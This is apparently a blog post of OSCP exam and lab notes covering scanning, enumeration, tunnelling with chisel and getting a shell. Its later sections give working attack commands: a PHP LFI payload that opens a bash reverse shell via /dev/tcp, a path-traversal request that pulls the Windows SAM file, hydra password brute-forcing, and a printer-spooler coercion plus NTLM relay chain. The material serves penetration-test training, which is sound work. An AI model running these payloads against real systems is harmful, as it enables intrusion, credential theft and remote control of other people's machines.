---
layout: post
tags: system web
title: OSCP tips and tricks
---

A summary of my notes during the OSCP labs and certification. I also decided to add a few tips I use for actual engagements (red team, pentest, and a bit of reversing). A lot of the commands, tools, and tips come from other online guides (OSCP related or not), they are linked at the bottom of this post.

How to pwn OSCP labs and exams ! (100 + 10 / 100 points)

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/PEN-200-course-icon.png)
{: refdef}

# TLDR;

> &rarr; Enumerate through thorough scans, do not overlook even the tiniest detail.<br>
> &rarr; Go breadth first, always.<br>
> &rarr; It's ok to fall in rabbit holes, proceed by elimination.<br>
> &rarr; If you already are a skilled professional, it's ok to find some of the lab boxes hard. In fact, a few of them rely more on CTF style riddles than actual penetration testing logic.<br>
> &rarr; Do not underestimate the power of morale during the exam. Sugar, tee, coffee, sleep, r00t (going for low hanging fruits will boost your confidence). <br>

# Part 1: Essential Tools

## Kali (yeah you'd guessed)
## CopyQ (https://hluk.github.io/CopyQ/)
Particularly powerful when typing in a shell that doesn't support the same keyboard layout, or does allow you to delete characters, or move in strings. You can prepare your commands in a buffer and send them when they are ready.

## [Foxy Proxy]([url](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)) or [Container Proxy]([url](https://addons.mozilla.org/en-US/firefox/addon/container-proxy/))
Container Proxy is very useful if you just want to proxy some tabs of your browser:
 
 {:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/OSCP/container.png)
{: refdef}

## My clipip.sh tool:

### Script:
 ```bash
 #!/bin/bash
 
 o=$(xclip -o |tr -d '\n')
 ip -f inet addr show tun0 | awk '/inet / {print $2}'|cut -d '/' -f1|tr -d '\n'|xclip -selection c
 #You can replace tun0 with any interface if you don't intend to use the script over a VPN (eth0, wlan0...)
 sleep 0.1
 #xdotool key ctrl+shift+v 
 # You can use this line if you prefer not to enable CTRL+V in your terminal
 xdotool key ctrl+v
 echo -n $o|xclip -selection c
 ```
 ### Enable CTRL+V in alacritty:
 ```yaml
 key_bindings:
  - { key: V, mods: Control, action: Paste }
 ```
### Add shortcut in i3 config:
```bash
bindsym --release $mod+Shift+i exec <path to clipip.sh>
```
Once that is done, you can press Alt+Shift+i in pretty much any buffer, and that will paste your IP. It is pretty useful during the OSCP, as the VPN's outgoing can change, and will be pasted pretty much in every script, cli and payload.

**Note** I use [Kali clean]([url](https://github.com/xct/kali-clean)) with a few tweaks (like a different wallpaper obviously...)

# Part 1: General Methodolgy

I can't emphasize enough on this, **breadth first. Always.** I've found myself digging in rabbit holes more times than I can count. And being as stubborn as a donkey, I have spent literal days working on pointless exploits, when a simple *searchsploit -m* on another port I even had scanned, would instantly give me an initial foothold.

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/OSCP/graph.webp)
{: refdef}

The idea is:

* Note everything that comes to your mind when discovering the challenge (names, ports, services, nothing is done randomly and a lot of those are actual hints).
* Scan everything.
* Google every known protocol or port and version identified (you might find very easily exploitable processes).
* Once you are certain you have covered everything thats open, start digging more deeply.
* After doing that, you should follow your intuition (that little bell that rings at the end of the first scan, saying "hoo this is open ??? **nice.**") and try the leads you thought were the best ones initially.
* If and once you have proven your intuition *wrong*, you can start proceeding by elimination and go through all potential leads, one by one.

# Part 2: Information Gathering

For the labs and exam, I applied the same method over and over, and always obtained good results (except for UDP of course but what an annoying procotol).

## Ping Sweep

```bash
#! /bin/bash
for ip in $(seq 1 256); do
 fping -c 1 -t 500 $1.$ip 2>&1 |grep max|cut -d ':' -f1|tr -d ' '
done
```

## 3 steps (4 if UDP) scanning process

Of course you could use [Nmap automator]([url](https://github.com/21y4d/nmapAutomator)), but if you want to do things manually, here is my way:

```bash
# Get all ports
nmap -p- -T5 -Pn <IP>|grep open|awk '{print $1}'|cut -d '/' -f1|tr '\n' ','
```
This should give you a nmappable list of ports like 80,443,3389,10069.

```bash
# Fingerprinting scan
sudo nmap -p <port list> -T5 -A -R -O <IP> -Pn
```

Although it might be a bit redundant with the next step, it is much quicker, and will give you something to work on while the last scan runs.

```bash
# Script scan
nmap -p <port list> -T5 -sV --version-all --script default,auth,brute,discovery,vuln <IP> -Pn
```

This one is not very subtle, but it **will** find a lot of interesting information, at no cost. You might find things like:

* FTP authentication (very often anonymous)
* SSH version
* SMB user names and local information
* Known exploits (not very accurate but it has worked a few times in the lab)

If you haven't found anything, you can then proceed to scan for UDP ports:

```bash
nmap -T5 -sU --top-ports 10000 <IP>
```

**Note:** I use T5 pretty much every time I can, but if you start receiving:
```
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
```
then you should try with lower values (T4/T3). 

## Common enumerations and vulnerabilities checks

If you encounter Linux with OpenSSH < 7.7, I highly recommend using SSH user oracle (CVE-2018-15473), as it could give you existing system users, that could then used for brute force or spraying. I use [this script]([url](https://github.com/epi052/cve-2018-15473/blob/master/ssh-username-enum.py)), but exploit db has a [working one too]([url](https://www.exploit-db.com/exploits/45233)).

```bash
python ssh-username-enum.py <IP> -w <wordlist>
```

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/OSCP/sshenum.png)
{: refdef}

I mostly used [this]([url](https://github.com/pentestmonkey/yaptest/blob/master/ssh-usernames.txt)) wordlist, but [Seclists]([url](https://github.com/danielmiessler/SecLists/tree/master/Usernames)) also has a good amount of common usernames to try.

Also do not forget to complete the wordlists, or create new custom ones, with the credentials you find. Some might be reused, boxes have dependencies.


When discovering Windows host, I recommend checking for SMB exploits:

```bash
nmap -T5 -sV --script 'smb-vuln*' <IP>
```

It should cover:

* cve-2017-7494
* cve2009-3103
* ms06-025
* ms07-029
* ms08-067
* ms10-054
* ms10-061
* **ms17-010**
* regsvc-dos

and Bluekeep (CVE-2019-0708) using [rdpscan]([url](https://github.com/robertdavidgraham/rdpscan)):

```bash
./rdpscan <ip>
```

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/OSCP/rdpscan.jpg)
{: refdef}


Although keep in mind that Bluekeep is not very stable, and it might very well just **crash** the target. It would still be considered **vulnerable** obviously, but exploitation is not necessarily possible. It's also possible to use the metasploit module for this:

```bash
nmap -p3389 -T5 <subnet>/24 -oG - | awk '/Up$/{print $2}' > rdp.lst
msfconsole
> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
> set RHOSTS file:<path to rdp.lst>
> run
...
 [+] 10.X.X.X:3389      - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
```
 Lastly, always check for smb shares, sometimes it is possible to mount them without having credentials:
 
 ```bash
 crackmapexec smb <IP> -u '' -p '' --shares
 ```

Most of those should have been raised by nmap script's scan, but its always good to double check when in doubt. Nmap's scripting engine can crash in case of host timeouts, and you will miss some important results.

## Scanning through tunnels

I highly recommended using those two projects:

* https://github.com/projectdiscovery/naabu
* https://github.com/jpillora/chisel

### Socks proxy

```bash
# Run on your machine, will open port 443
chisel server -p 443 --reverse --socks5
# Run on tunneling server, will open 1080 on your local machine once connected
chisel client 192.168.119.248:443 R:socks
```

And then, run a port scan using naabu:

```bash
naabu -rate 500 -c 10 -s connect -p  -  -host 10.X.X.X -proxy 127.0.0.1:1080
```

Naabu can crash chisel if too many concurrent threads are running, hence the specification of *rate* and *workers*. Naabu is generally much faster than nmap for simple port scans. Anyone who has used ```proxychains nmap``` knows how **slow** a simple scan can get. 

### Port forward

If you intend on bypassing **localhost** whitelisting (usually for mysql, phpmyadmin, but also sometimes web interfaces) I recommend using port forwarding to local host. For instance, connecting to root with mysql might get the message:

> ERROR 1130 (00000): Host 'X.X.X.X' is not allowed to connect to this MySQL server

```bash
# Run on your machine, will open port 443
chisel server -p 443 --reverse --socks5
# Open port 3306 on your local machine to proxy packets towards target
chisel client 192.168.119.248:443 R:3306:localhost:3306
```
Then, you can simply use:

```bash
mysql -u root -p<pass> -h 127.0.0.1
```

# Part 3: Getting a shell

> searchsploit
> msfconsole; search
> google

Using this, you should have found a working exploit, now get a shell using [revshell.com]([url](https://www.revshells.com/))!

Here is a few commands I found to be usefule for exploiting various services:

## Useful commands

1. Want to exfiltrate binary data embeded in HTML tags?

```bash
 wget -qO- 'http://X.X.X.X/vulnpage?vulparam=..\..\..\..\..\..\..\..\..\..\..%5cWINDOWS%5cRepair%5cSAM%00en' |perl -l -0777 -ne 'print $1 if /<title.*?>\s*(.*?)\s*<\/title/si' > SAM
```

2. PHP LFI, but no file gets executed?

```php
data:text/plain,<?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
```

3. Trying to get a password on a web interface?

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt X.X.X.X http-post-form "/URL/Login:User=^USER&password=^PASS:F=<Some string indicating a failed attempt>" -I
```

4. Having trouble connecting to RDP?

> transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]

```bash
xfreerdp /u:user /p:'password' /v:X.X.X.X  /sec:rdp
# OR, if having a different connect error, also try:
xfreerdp /u:user /p:'password' /v:X.X.X.X  /sec:tls
# and if you want to have files and clipboard there:
xfreerdp /u:user /p:'password' /v:X.X.X.X  /sec:<whatever> /drive:<absolute path to your local folder>,/
```

5. Want to get some machine accounts hashes? (most tips are from [hack tricks]([url](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printers-spooler-service-abuse))

```bash
# https://github.com/SecureAuthCorp/impacket/blob/master/examples/rpcdump.py
rcpdump.py <IP>|grep MS-RPRN
# https://github.com/NotMedic/NetNTLMtoSilverTicket
python dementor.py -u Guest -p ''  <target> <responder>
```

You can aslo relay those hashes, as it is likely not interesting to crack them, using [ntlmrelay]([url](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)):

```bash
# list machines with SMB
nmap -p139;445 -T5 <subnet>/24 -oG - | awk '/Up$/{print $2}' > smb.lst
# shortlist IP's with spooler active
while read ip; do rcpdump.py $ip|grep -q MS-RPRN && echo $ip >> spooler.lst || :;done < smb.lst
# generate a list of targets without SMB signing
crackmapexec smb <subnet> --genrelay-list > targets.lst
# start relay server
ntlmrelayx.py -l loot -smb2support -socks -tf targets.lst
# force NetNTLMv2 authentication to your relay (need valid credentials to perform the attack)
while read ip; do python dementor.py -u user -p 'password' $ip <responder ip>;done < spooler.lst
# profit
nc localhost <port open by ntlmrelayx>
```

**Note: **  this would be more useful during a real engagement than the exam itself.


If nothing works, it might be:

## Buffer Overflow

## User Interaction

